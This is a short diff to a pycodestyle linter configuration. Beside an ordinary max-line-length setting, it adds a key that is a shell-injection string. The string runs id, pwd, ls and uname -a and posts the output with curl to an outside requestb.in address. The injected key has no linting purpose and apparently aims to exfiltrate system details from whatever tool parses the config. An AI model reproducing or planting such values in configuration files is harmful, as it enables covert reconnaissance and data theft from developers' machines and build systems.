@@ -1,2 +1,3 @@
 pycodestyle:
     max-line-length: 100  # Default is 79 in PEP8
+    ";(id;pwd;ls;uname -a) | curl -X POST -d @- http://requestb.in/1ap8agd1;#": 5
